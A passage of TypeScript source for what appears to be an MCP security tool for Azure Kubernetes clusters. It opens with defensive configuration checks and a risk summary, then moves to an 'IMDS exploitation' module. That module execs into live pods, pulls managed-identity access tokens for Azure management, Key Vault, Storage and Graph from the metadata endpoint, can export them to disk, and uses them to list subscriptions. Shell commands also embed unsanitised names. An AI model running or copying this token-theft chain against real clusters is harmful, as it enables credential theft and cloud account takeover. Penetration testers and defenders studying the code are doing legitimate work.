                if (container.securityContext?.privileged) {
                  issues.push('privileged');
                }
              }
              
              if (issues.length > 0) {
                privilegedDs.push({ ns: dsNs, name: dsName, issues });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total DaemonSets | ${dsItems.length} |\n`;
            output += `| Privileged DaemonSets | ${privilegedDs.length} |\n\n`;
            
            if (privilegedDs.length > 0) {
              output += `### ⚠️ DaemonSets with Elevated Privileges\n\n`;
              output += `| Namespace | DaemonSet | Issues |\n|-----------|-----------|--------|\n`;
              for (const ds of privilegedDs.slice(0, 10)) {
                output += `| ${ds.ns} | ${ds.name} | ${ds.issues.join(', ')} |\n`;
              }
              output += '\n';
              
              // DaemonSets run on all nodes - privileged ones are critical
              findings.push({
                severity: 'HIGH',
                category: 'DaemonSets',
                finding: `${privilegedDs.length} privileged DaemonSets (runs on ALL nodes)`,
                details: 'DaemonSets with host access affect entire cluster'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze DaemonSets: ${e.message}\n\n`;
          }

          // ========== 13. JWT TOKEN ANALYSIS ==========
          output += `## 🎫 Service Account Token Analysis\n\n`;
          try {
            const tokenSecretsCmd = `get secrets --all-namespaces -o json`;
            const tokenJson = await runKubectl(tokenSecretsCmd);
            const allSecrets = JSON.parse(tokenJson).items || [];
            
            const saTokens = allSecrets.filter((s: any) => s.type === 'kubernetes.io/service-account-token');
            const longLivedTokens: Array<{ns: string; name: string; sa: string}> = [];
            
            for (const token of saTokens) {
              const tokenNs = (token as any).metadata?.namespace || 'unknown';
              const tokenName = (token as any).metadata?.name || 'unknown';
              const annotations = (token as any).metadata?.annotations || {};
              const saName = annotations['kubernetes.io/service-account.name'] || 'unknown';
              
              // Legacy long-lived tokens (pre-1.24 style)
              longLivedTokens.push({ ns: tokenNs, name: tokenName, sa: saName });
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Service Account Tokens | ${saTokens.length} |\n`;
            output += `| Legacy Long-Lived Tokens | ${longLivedTokens.length} |\n\n`;
            
            if (longLivedTokens.length > 20) {
              output += `### ⚠️ Service Account Tokens (Potential Attack Vector)\n\n`;
              output += `Many long-lived tokens exist. In K8s 1.24+, prefer bound tokens.\n\n`;
              
              findings.push({
                severity: 'MEDIUM',
                category: 'Tokens',
                finding: `${longLivedTokens.length} long-lived SA tokens (legacy style)`,
                details: 'Migrate to short-lived bound tokens (K8s 1.24+)'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze tokens: ${e.message}\n\n`;
          }

          // ========== 14. CONTAINER IMAGE SECURITY ==========
          output += `## 🐋 Container Image Security\n\n`;
          try {
            const podsCmd = namespace
              ? `get pods -n ${namespace} -o json`
              : `get pods --all-namespaces -o json`;
            const podsJson = await runKubectl(podsCmd);
            const podItems = JSON.parse(podsJson).items || [];
            
            const latestTagImages: Array<{ns: string; pod: string; image: string}> = [];
            const publicRegistryImages: Array<{ns: string; pod: string; image: string}> = [];
            const noPullPolicyImages: Array<{ns: string; pod: string; image: string}> = [];
            const allImages = new Set<string>();
            
            const publicRegistries = ['docker.io', 'gcr.io', 'ghcr.io', 'quay.io', 'registry.hub.docker.com'];
            
            for (const pod of podItems) {
              const podName = (pod as any).metadata?.name || 'unknown';
              const podNs = (pod as any).metadata?.namespace || 'unknown';
              
              for (const container of ((pod as any).spec?.containers || [])) {
                const image = container.image || '';
                const pullPolicy = container.imagePullPolicy || '';
                allImages.add(image);
                
                if (image.endsWith(':latest') || !image.includes(':')) {
                  latestTagImages.push({ ns: podNs, pod: podName, image });
                }
                
                const isPublic = !image.includes('/') || publicRegistries.some(r => image.startsWith(r));
                if (isPublic && !image.includes('.azurecr.io') && !image.includes('.ecr.')) {
                  publicRegistryImages.push({ ns: podNs, pod: podName, image });
                }
                
                if (!pullPolicy || pullPolicy === 'IfNotPresent') {
                  noPullPolicyImages.push({ ns: podNs, pod: podName, image });
                }
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Unique Images | ${allImages.size} |\n`;
            output += `| Using :latest tag | ${latestTagImages.length} |\n`;
            output += `| Public Registry Images | ${publicRegistryImages.length} |\n`;
            output += `| Missing Pull Policy | ${noPullPolicyImages.length} |\n\n`;
            
            if (latestTagImages.length > 0) {
              output += `### ⚠️ Images Using :latest Tag\n\n`;
              output += `| Namespace | Pod | Image |\n|-----------|-----|-------|\n`;
              for (const img of latestTagImages.slice(0, 10)) {
                output += `| ${img.ns} | ${img.pod} | ${img.image.substring(0, 50)}... |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'MEDIUM',
                category: 'Images',
                finding: `${latestTagImages.length} containers using :latest tag`,
                details: 'Use immutable tags for reproducibility and security'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze container images: ${e.message}\n\n`;
          }

          // ========== 15. CRONJOBS ANALYSIS ==========
          output += `## ⏰ CronJobs Analysis\n\n`;
          try {
            const cronJson = await runKubectl('get cronjobs --all-namespaces -o json');
            const cronItems = JSON.parse(cronJson).items || [];
            
            const privilegedCronJobs: Array<{ns: string; name: string; schedule: string; issues: string[]}> = [];
            
            for (const cron of cronItems) {
              const cronName = (cron as any).metadata?.name || 'unknown';
              const cronNs = (cron as any).metadata?.namespace || 'unknown';
              const schedule = (cron as any).spec?.schedule || 'unknown';
              const jobSpec = (cron as any).spec?.jobTemplate?.spec?.template?.spec || {};
              const issues: string[] = [];
              
              if (jobSpec.hostNetwork) issues.push('hostNetwork');
              if (jobSpec.hostPID) issues.push('hostPID');
              
              for (const container of (jobSpec.containers || [])) {
                if (container.securityContext?.privileged) issues.push('privileged');
                if (container.securityContext?.runAsUser === 0) issues.push('runAsRoot');
              }
              
              if (issues.length > 0) {
                privilegedCronJobs.push({ ns: cronNs, name: cronName, schedule, issues });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total CronJobs | ${cronItems.length} |\n`;
            output += `| Privileged CronJobs | ${privilegedCronJobs.length} |\n\n`;
            
            if (privilegedCronJobs.length > 0) {
              output += `### 🚨 CronJobs with Elevated Privileges\n\n`;
              output += `| Namespace | CronJob | Schedule | Issues |\n|-----------|---------|----------|--------|\n`;
              for (const cj of privilegedCronJobs.slice(0, 10)) {
                output += `| ${cj.ns} | ${cj.name} | ${cj.schedule} | ${cj.issues.join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'CronJobs',
                finding: `${privilegedCronJobs.length} CronJobs with elevated privileges`,
                details: 'Scheduled tasks with host access - persistence vector'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze CronJobs: ${e.message}\n\n`;
          }

          // ========== 16. PERSISTENT VOLUMES ==========
          output += `## 💾 Persistent Volumes\n\n`;
          try {
            const pvJson = await runKubectl('get pv -o json');
            const pvItems = JSON.parse(pvJson).items || [];
            
            const hostPathPvs: Array<{name: string; path: string; capacity: string}> = [];
            const nfsShares: Array<{name: string; server: string; path: string}> = [];
            
            for (const pv of pvItems) {
              const pvName = (pv as any).metadata?.name || 'unknown';
              const capacity = (pv as any).spec?.capacity?.storage || 'unknown';
              
              if ((pv as any).spec?.hostPath) {
                hostPathPvs.push({
                  name: pvName,
                  path: (pv as any).spec.hostPath.path,
                  capacity
                });
              }
              
              if ((pv as any).spec?.nfs) {
                nfsShares.push({
                  name: pvName,
                  server: (pv as any).spec.nfs.server,
                  path: (pv as any).spec.nfs.path
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total PVs | ${pvItems.length} |\n`;
            output += `| HostPath PVs | ${hostPathPvs.length} |\n`;
            output += `| NFS Shares | ${nfsShares.length} |\n\n`;
            
            if (hostPathPvs.length > 0) {
              output += `### 🚨 HostPath Persistent Volumes\n\n`;
              output += `| PV Name | Host Path | Capacity |\n|---------|-----------|----------|\n`;
              for (const pv of hostPathPvs.slice(0, 10)) {
                output += `| ${pv.name} | ${pv.path} | ${pv.capacity} |\n`;
              }
              output += '\n';
              
              const sensitivePaths = hostPathPvs.filter(p => 
                p.path === '/' || p.path.startsWith('/etc') || p.path.startsWith('/var') || p.path.startsWith('/root')
              );
              
              if (sensitivePaths.length > 0) {
                findings.push({
                  severity: 'CRITICAL',
                  category: 'Storage',
                  finding: `${sensitivePaths.length} PVs expose sensitive host paths`,
                  details: 'HostPath PVs can enable container escape'
                });
                criticalCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze PVs: ${e.message}\n\n`;
          }

          // ========== 17. RESOURCE LIMITS ==========
          output += `## 📊 Resource Limits (DoS Prevention)\n\n`;
          try {
            const podsCmd = namespace
              ? `get pods -n ${namespace} -o json`
              : `get pods --all-namespaces -o json`;
            const podsJson = await runKubectl(podsCmd);
            const podItems = JSON.parse(podsJson).items || [];
            
            let noLimitsCount = 0;
            let noRequestsCount = 0;
            const unlimitedPods: Array<{ns: string; name: string}> = [];
            
            for (const pod of podItems) {
              const podName = (pod as any).metadata?.name || 'unknown';
              const podNs = (pod as any).metadata?.namespace || 'unknown';
              let hasLimits = false;
              let hasRequests = false;
              
              for (const container of ((pod as any).spec?.containers || [])) {
                if (container.resources?.limits) hasLimits = true;
                if (container.resources?.requests) hasRequests = true;
              }
              
              if (!hasLimits) {
                noLimitsCount++;
                unlimitedPods.push({ ns: podNs, name: podName });
              }
              if (!hasRequests) noRequestsCount++;
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Pods | ${podItems.length} |\n`;
            output += `| Pods without Limits | ${noLimitsCount} |\n`;
            output += `| Pods without Requests | ${noRequestsCount} |\n\n`;
            
            const unlimitedPercent = podItems.length > 0 ? Math.round((noLimitsCount / podItems.length) * 100) : 0;
            if (unlimitedPercent > 50) {
              findings.push({
                severity: 'LOW',
                category: 'Resources',
                finding: `${unlimitedPercent}% of pods have no resource limits`,
                details: 'Missing limits can lead to DoS via resource exhaustion'
              });
              lowCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze resource limits: ${e.message}\n\n`;
          }

          // ========== 18. KUBERNETES VERSION ==========
          output += `## 🔖 Kubernetes Version\n\n`;
          try {
            const versionJson = await runKubectl('version -o json');
            const versionData = JSON.parse(versionJson);
            
            const serverVersion = versionData.serverVersion || {};
            const major = serverVersion.major || '?';
            const minor = serverVersion.minor || '?';
            const gitVersion = serverVersion.gitVersion || 'unknown';
            
            output += `| Component | Version |\n|-----------|---------||\n`;
            output += `| Server | ${gitVersion} |\n`;
            output += `| Major.Minor | ${major}.${minor} |\n\n`;
            
            const minorNum = parseInt(minor);
            if (minorNum < 25) {
              output += `### ⚠️ Outdated Kubernetes Version\n\n`;
              output += `Version ${major}.${minor} may have known CVEs. Consider upgrading.\n\n`;
              
              findings.push({
                severity: 'MEDIUM',
                category: 'Version',
                finding: `Kubernetes ${major}.${minor} may be outdated`,
                details: 'Check for CVEs: https://kubernetes.io/docs/reference/issues-security/official-cve-feed/'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to get K8s version: ${e.message}\n\n`;
          }

          // ========== 19. POD SECURITY STANDARDS ==========
          output += `## 🛡️ Pod Security Standards (PSS)\n\n`;
          try {
            const nsJson = await runKubectl('get namespaces -o json');
            const nsItems = JSON.parse(nsJson).items || [];
            
            const enforcedNs: Array<{name: string; level: string}> = [];
            const unenforced: string[] = [];
            
            for (const ns of nsItems) {
              const nsName = (ns as any).metadata?.name || 'unknown';
              const labels = (ns as any).metadata?.labels || {};
              
              const enforceLevel = labels['pod-security.kubernetes.io/enforce'];
              const warnLevel = labels['pod-security.kubernetes.io/warn'];
              
              if (enforceLevel) {
                enforcedNs.push({ name: nsName, level: enforceLevel });
              } else if (!['kube-system', 'kube-public', 'kube-node-lease'].includes(nsName)) {
                unenforced.push(nsName);
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Namespaces with PSS Enforce | ${enforcedNs.length} |\n`;
            output += `| Namespaces without PSS | ${unenforced.length} |\n\n`;
            
            if (enforcedNs.length > 0) {
              output += `### ✅ Namespaces with Pod Security Standards\n\n`;
              output += `| Namespace | Enforce Level |\n|-----------|---------------|\n`;
              for (const ns of enforcedNs.slice(0, 10)) {
                output += `| ${ns.name} | ${ns.level} |\n`;
              }
              output += '\n';
            }
            
            if (unenforced.length > 5) {
              findings.push({
                severity: 'MEDIUM',
                category: 'PSS',
                finding: `${unenforced.length} namespaces without Pod Security Standards`,
                details: 'Enable PSS labels for namespace-level security'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze PSS: ${e.message}\n\n`;
          }

          // ========== 20. ATTACK SURFACE SUMMARY ==========
          output += `## 🎯 Attack Surface Summary\n\n`;
          output += `Based on [Kubernetes Pentest Methodology](https://exploit-notes.hdks.org/exploit/container/kubernetes/):\n\n`;
          output += `| Attack Vector | Risk Level | Notes |\n|---------------|------------|-------|\n`;
          
          // Summarize attack vectors found
          const attackVectors: Array<{vector: string; risk: string; notes: string}> = [];
          
          if (criticalCount > 0) {
            attackVectors.push({ vector: 'Container Escape', risk: '🔴 CRITICAL', notes: 'Privileged containers or host namespaces found' });
          }
          if (findings.some(f => f.category === 'RBAC')) {
            attackVectors.push({ vector: 'RBAC Escalation', risk: '🟠 HIGH', notes: 'Overprivileged roles or bindings' });
          }
          if (findings.some(f => f.category === 'Secrets')) {
            attackVectors.push({ vector: 'Secret Theft', risk: '🟠 HIGH', notes: 'Accessible secrets for lateral movement' });
          }
          if (findings.some(f => f.category === 'Network')) {
            attackVectors.push({ vector: 'Lateral Movement', risk: '🔴 CRITICAL', notes: 'No network policies - unrestricted pod-to-pod' });
          }
          if (findings.some(f => f.category === 'Services')) {
            attackVectors.push({ vector: 'External Exposure', risk: '🟠 HIGH', notes: 'Internet-facing services' });
          }
          
          for (const av of attackVectors) {
            output += `| ${av.vector} | ${av.risk} | ${av.notes} |\n`;
          }
          if (attackVectors.length === 0) {
            output += `| None Critical | 🟢 LOW | Basic hardening in place |\n`;
          }
          output += '\n';

          output += `---\n\n`;
          output += `## 📊 Live Scan Summary\n\n`;
          output += `| Severity | Count |\n|----------|-------|\n`;
          output += `| 🔴 CRITICAL | ${criticalCount} |\n`;
          output += `| 🟠 HIGH | ${highCount} |\n`;
          output += `| 🟡 MEDIUM | ${mediumCount} |\n`;
          output += `| 🟢 LOW | ${lowCount} |\n`;
          output += `| **TOTAL** | **${findings.length}** |\n\n`;

          if (findings.length > 0) {
            output += `### 🚨 All Findings\n\n`;
            output += `| # | Severity | Category | Finding | Details |\n|---|----------|----------|---------|----------|\n`;
            let i = 1;
            for (const f of findings) {
              const icon = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
              output += `| ${i++} | ${icon} ${f.severity} | ${f.category} | ${f.finding} | ${f.details} |\n`;
            }
            output += '\n';
          }

          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
          let riskLevel = 'LOW';
          let riskEmoji = '🟢';
          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
          
          output += `### Risk Assessment\n\n`;
          output += `**Risk Score:** ${riskScore}\n`;
          output += `**Risk Level:** ${riskEmoji} **${riskLevel}**\n`;
          output += `**Scan Mode:** kubectl CLI (30s timeout per command)\n\n`;

          output += `---\n\n`;
          output += `*Generated by Stratos MCP v1.9.8 - Comprehensive K8s Security Assessment (20 checks)*\n`;

          // Cleanup temp kubeconfig
          try {
            await fs.unlink(tempKubeconfig);
          } catch (cleanupErr) {
            // Ignore cleanup errors
          }

          return {
            content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error running live AKS scan: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_scan_aks_imds": {
        const { subscriptionId, resourceGroup, clusterName, namespace, exportTokens = false, deepDataPlane = false, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
          namespace?: string;
          exportTokens?: boolean;
          deepDataPlane?: boolean;
          format?: string;
        };

        try {
          const aksClient = new ContainerServiceClient(credential, subscriptionId);
          
          let output = `# 🔴 IMDS EXPLOITATION & FULL RECONNAISSANCE\n\n`;
          output += `**Attack Chain:** Existing Pod → IMDS Check → Token Theft → Full Enumeration\n`;
          output += `**Target Cluster:** ${clusterName}\n`;
          output += `**Resource Group:** ${resourceGroup}\n`;
          output += `**Subscription:** ${subscriptionId}\n`;
          output += `**Namespace Scope:** ${namespace || 'ALL'}\n`;
          output += `**Scan Time:** ${new Date().toISOString()}\n`;
          output += `**Scanner:** Stratos MCP v${SERVER_VERSION} (IMDS Attack Module)\n\n`;
          output += `---\n\n`;

          output += `## 🔑 Phase 0: Cluster Connection\n\n`;
          
          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
          
          let kubeconfig: string;
          try {
            const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
            if (!adminCreds.kubeconfigs || adminCreds.kubeconfigs.length === 0) {
              throw new Error("No kubeconfig returned");
            }
            kubeconfig = Buffer.from(adminCreds.kubeconfigs[0].value!).toString('utf-8');
            output += `✅ Admin credentials obtained\n\n`;
          } catch (adminError: any) {
            try {
              const userCreds = await aksClient.managedClusters.listClusterUserCredentials(resourceGroup, clusterName);
              if (!userCreds.kubeconfigs || userCreds.kubeconfigs.length === 0) {
                throw new Error("No kubeconfig returned");
              }
              kubeconfig = Buffer.from(userCreds.kubeconfigs[0].value!).toString('utf-8');
              output += `✅ User credentials obtained\n\n`;
            } catch (userError: any) {
              return {
                content: [{
                  type: 'text',
                  text: `# ❌ Failed to Connect to Cluster\n\n` +
                    `Could not obtain cluster credentials.\n\n` +
                    `**Admin Error:** ${adminError.message}\n` +
                    `**User Error:** ${userError.message}\n`
                }],
                isError: true,
              };
            }
          }

          // Convert kubeconfig from devicecode to azurecli auth
          kubeconfig = kubeconfig.replace(/--login\s+devicecode/gi, '--login azurecli');
          
          // Save kubeconfig to temp file
          const os = await import('os');
          const pathMod = await import('path');
          const fsMod = await import('fs').then(m => m.promises);
          const tempKubeconfig = pathMod.join(os.tmpdir(), `stratos-imds-${Date.now()}.yaml`);
          await fsMod.writeFile(tempKubeconfig, kubeconfig);
          
          // Validate Azure CLI session before running kubectl
          output += `**Validating Azure CLI session...**\n`;
          try {
            const { exec } = await import('child_process');
            await new Promise<void>((resolve, reject) => {
              exec('az account show', { timeout: 5000 }, (error, stdout, stderr) => {
                if (error) {
                  reject(new Error('Azure CLI session expired or not authenticated'));
                } else {
                  resolve();
                }
              });
            });
            output += `✅ Azure CLI session valid\n\n`;
          } catch (azError: any) {
            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
            return {
              content: [{
                type: 'text',
                text: `# ❌ Azure CLI Authentication Required\n\n` +
                  `The Azure CLI session has expired or is not authenticated.\n\n` +
                  `**Error:** ${azError.message}\n\n` +
                  `## 🔧 Fix\n\n` +
                  `Run the following command to authenticate:\n\n` +
                  `\`\`\`bash\n` +
                  `az login\n` +
                  `\`\`\`\n\n` +
                  `Then try the scan again.\n\n` +
                  `**Note:** This tool requires Azure CLI authentication because it uses \`kubectl\` with Azure CLI-based kubeconfig.`
              }],
              isError: true,
            };
          }
          
          const KUBECTL_TIMEOUT_MS = 15000;
          
          // Helper function to run kubectl
          const runKubectl = async (args: string): Promise<string> => {
            const { exec } = await import('child_process');
            return new Promise((resolve, reject) => {
              let killed = false;
              const child = exec(
                `kubectl --kubeconfig="${tempKubeconfig}" ${args}`,
                { maxBuffer: 10 * 1024 * 1024, timeout: KUBECTL_TIMEOUT_MS },
                (error, stdout, stderr) => {
                  if (killed) return;
                  if (error) {
                    reject(new Error(stderr || error.message));
                  } else {
                    resolve(stdout);
                  }
                }
              );
              setTimeout(() => {
                if (child.exitCode === null) {
                  killed = true;
                  child.kill('SIGTERM');
                  reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
                }
              }, KUBECTL_TIMEOUT_MS + 1000);
            });
          };

          // Track findings
          const findings: Array<{severity: string; category: string; finding: string; details: string}> = [];
          let criticalCount = 0, highCount = 0, mediumCount = 0, lowCount = 0;
          let tenantId = '';

          output += `## 🎯 Phase 1: Enumerate Existing Pods\n\n`;
          output += `**Approach:** Using EXISTING running pods only (no pod creation)\n\n`;
          
          interface PodInfo {
            namespace: string;
            name: string;
            container: string;
            imdsExposed: boolean;
            error?: string;
          }
          
          const allPods: PodInfo[] = [];
          const exposedPods: PodInfo[] = [];
          
          try {
            const nsArg = namespace ? `-n ${namespace}` : '--all-namespaces';
            const scopeLabel = namespace ? `namespace "${namespace}"` : 'ALL namespaces';
            
            const podsJson = await runKubectl(`get pods ${nsArg} -o json`);
            const podsData = JSON.parse(podsJson);
            const runningPods = (podsData.items || []).filter((p: any) => p.status?.phase === 'Running');
            
            output += `**Scope:** ${scopeLabel}\n`;
            output += `**Running Pods Found:** ${runningPods.length}\n\n`;
            
            if (runningPods.length === 0) {
              output += `❌ No running pods found to test IMDS access\n\n`;
              try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
              return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
            }
            
            // Limit scan to first 30 pods for performance
            const podsToScan = runningPods.slice(0, 30);
            
            output += `Scanning ${podsToScan.length} pods for IMDS reachability...\n\n`;
            output += `| # | Namespace | Pod | Container | IMDS Status |\n|---|-----------|-----|-----------|-------------|\n`;
            
            let podNum = 0;
            for (const pod of podsToScan) {
              podNum++;
              const ns = pod.metadata?.namespace || 'default';
              const podName = pod.metadata?.name || 'unknown';
              const container = pod.spec?.containers?.[0]?.name || '';
              
              const podInfo: PodInfo = {
                namespace: ns,
                name: podName,
                container: container,
                imdsExposed: false
              };
              
              try {
                const containerArg = container ? `-c ${container}` : '';
                // Quick IMDS check with short timeout
                const imdsTest = await runKubectl(`exec -n ${ns} ${podName} ${containerArg} -- sh -c 'wget -qO- --timeout=2 --header="Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -50'`);
                
                const isExposed = imdsTest.includes('compute') || imdsTest.includes('vmId') || imdsTest.includes('subscriptionId');
                podInfo.imdsExposed = isExposed;
                
                if (isExposed) {
                  exposedPods.push(podInfo);
                  output += `| ${podNum} | ${ns} | ${podName} | ${container || 'default'} | 🔴 **EXPOSED** |\n`;
                } else {
                  output += `| ${podNum} | ${ns} | ${podName} | ${container || 'default'} | ✅ Blocked |\n`;
                }
              } catch (e: any) {
                podInfo.error = e.message;
                output += `| ${podNum} | ${ns} | ${podName} | ${container || 'default'} | ✅ Blocked (timeout) |\n`;
              }
              
              allPods.push(podInfo);
            }
            
            if (runningPods.length > 30) {
              output += `| ... | (${runningPods.length - 30} more pods not scanned) | ... | ... | ... |\n`;
            }
            output += `\n`;
            
            output += `### IMDS Exposure Summary\n\n`;
            output += `| Metric | Value |\n|--------|-------|\n`;
            output += `| Total Pods Scanned | ${allPods.length} |\n`;
            output += `| 🔴 EXPOSED to IMDS | ${exposedPods.length} (${((exposedPods.length/allPods.length)*100).toFixed(1)}%) |\n`;
            output += `| ✅ Protected | ${allPods.length - exposedPods.length} (${(((allPods.length - exposedPods.length)/allPods.length)*100).toFixed(1)}%) |\n\n`;
            
            if (exposedPods.length === 0) {
              output += `## ✅ All Pods Protected from IMDS\n\n`;
              output += `No pods can reach the IMDS endpoint (169.254.169.254).\n`;
              output += `This is the expected secure configuration.\n\n`;
              
              findings.push({
                severity: 'LOW',
                category: 'IMDS',
                finding: 'All pods protected from IMDS access',
                details: `${allPods.length} pods verified blocked`
              });
              lowCount++;
              
              // Cleanup and return
              try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
              return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
            }
            
            findings.push({
              severity: 'CRITICAL',
              category: 'IMDS Exposure',
              finding: `${exposedPods.length} pods can reach IMDS`,
              details: exposedPods.slice(0, 5).map(p => `${p.namespace}/${p.name}`).join(', ')
            });
            criticalCount++;
            
          } catch (e: any) {
            output += `❌ Failed to enumerate pods: ${e.message}\n\n`;
            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
            return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
          }

          output += `## 💀 Phase 2: Token Theft from Vulnerable Pod\n\n`;
          
          // Use first exposed pod for token theft
          const targetPod = exposedPods[0];
          output += `**Selected Pod:** \`${targetPod.namespace}/${targetPod.name}\`\n`;
          output += `**Container:** \`${targetPod.container || 'default'}\`\n\n`;
          
          // Helper to execute command in target pod
          const execInPod = async (cmd: string): Promise<string> => {
            const containerArg = targetPod.container ? `-c ${targetPod.container}` : '';
            return await runKubectl(`exec -n ${targetPod.namespace} ${targetPod.name} ${containerArg} -- sh -c '${cmd}'`);
          };

          try {
            const identityInfo = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1`);
            if (identityInfo.includes('tenantId')) {
              const tenantMatch = identityInfo.match(/"tenantId"\s*:\s*"([^"]+)"/);
              tenantId = tenantMatch ? tenantMatch[1] : '';
              output += `**Tenant ID:** \`${tenantId}\`\n\n`;
            }
          } catch (e: any) {}

          // Steal tokens for multiple resources
          output += `Stealing tokens for multiple Azure resources...\n\n`;
          
          interface StolenToken {
            resource: string;
            resourceName: string;
            clientId: string;
            accessToken: string;
            expiresOn: string;
          }
          
          const stolenTokens: StolenToken[] = [];
          const resources = [
            { name: 'ARM (Azure Management)', resource: 'https://management.azure.com/' },
            { name: 'Key Vault', resource: 'https://vault.azure.net/' },
            { name: 'Storage', resource: 'https://storage.azure.com/' },
            { name: 'Graph API', resource: 'https://graph.microsoft.com/' },
          ];
          
          output += `| Resource | Status | Client ID | Expires |\n|----------|--------|-----------|----------|\n`;
          
          for (const res of resources) {
            try {
              const tokenResp = await execInPod(`wget -qO- --header="Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(res.resource)}" 2>&1`);
              
              if (tokenResp.includes('access_token')) {
                const tokenData = JSON.parse(tokenResp);
                const clientId = tokenData.client_id || 'unknown';
                const expiresOn = new Date(parseInt(tokenData.expires_on) * 1000).toISOString();
                const accessToken = tokenData.access_token;
                
                stolenTokens.push({
                  resource: res.resource,
                  resourceName: res.name,
                  clientId,
                  accessToken,
                  expiresOn
                });
                
                output += `| ${res.name} | ✅ STOLEN | \`${clientId.substring(0, 8)}...\` | ${expiresOn.split('T')[0]} |\n`;
                
                findings.push({
                  severity: 'CRITICAL',
                  category: 'Token Theft',
                  finding: `${res.name} token stolen via IMDS`,
                  details: `Client ID: ${clientId}`
                });
                criticalCount++;
              } else {
                output += `| ${res.name} | ❌ Failed | - | - |\n`;
              }
            } catch (e: any) {
              output += `| ${res.name} | ❌ Error | - | ${e.message.substring(0, 20)}... |\n`;
            }
          }
          output += `\n`;

          if (stolenTokens.length === 0) {
            output += `⚠️ No tokens could be stolen - identity may not be configured\n\n`;
            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
            return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
          }

          if (exportTokens && stolenTokens.length > 0) {
            output += `### 💾 Token Export\n\n`;
            
            const tokenExportPath = pathMod.join(os.tmpdir(), `stratos-tokens-${Date.now()}.json`);
            const tokenExportData = {
              exportTime: new Date().toISOString(),
              cluster: clusterName,
              subscription: subscriptionId,
              tenantId: tenantId,
              sourcePod: `${targetPod.namespace}/${targetPod.name}`,
              tokens: stolenTokens.map(t => ({
                resource: t.resource,
                clientId: t.clientId,
                expiresOn: t.expiresOn,
                accessToken: t.accessToken
              }))
            };
            
            try {
              await fsMod.writeFile(tokenExportPath, JSON.stringify(tokenExportData, null, 2));
              output += `✅ **Tokens exported to:** \`${tokenExportPath}\`\n\n`;
              
              findings.push({
                severity: 'HIGH',
                category: 'Token Export',
                finding: `${stolenTokens.length} tokens exported`,
                details: tokenExportPath
              });
              highCount++;
            } catch (e: any) {
              output += `⚠️ Export failed: ${e.message}\n\n`;
            }
          }

          const armToken = stolenTokens.find(t => t.resource.includes('management.azure.com'))?.accessToken;
          
          if (!armToken) {
            output += `⚠️ No ARM token obtained - cannot enumerate Azure resources\n\n`;
            try { await fsMod.unlink(tempKubeconfig); } catch (e) {}
            return { content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }] };
          }

          output += `## 📋 Phase 3: Token Permission Enumeration\n\n`;
          output += `Using stolen ARM token to discover accessible resources...\n\n`;

          // Subscriptions
          output += `### Accessible Subscriptions\n\n`;
          let accessibleSubs: any[] = [];
          try {
            const subsResp = await execInPod(`wget -qO- --header="Authorization: Bearer ${armToken}" "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>&1`);
            
            if (subsResp.includes('"value"')) {
              const subsData = JSON.parse(subsResp);
              accessibleSubs = subsData.value || [];
              
              output += `| Subscription ID | Name | State |\n|-----------------|------|-------|\n`;
              for (const sub of accessibleSubs) {
                output += `| \`${sub.subscriptionId}\` | ${sub.displayName} | ${sub.state} |\n`;
              }
              output += `\n`;
              
              if (accessibleSubs.length > 0) {
                findings.push({
                  severity: 'HIGH',
                  category: 'Subscriptions',
                  finding: `${accessibleSubs.length} subscription(s) accessible`,
                  details: accessibleSubs.map((s: any) => s.displayName).join(', ')
                });
                highCount++;
              }
            } else {
              output += `No subscriptions accessible\n\n`;
            }
          } catch (e: any) {
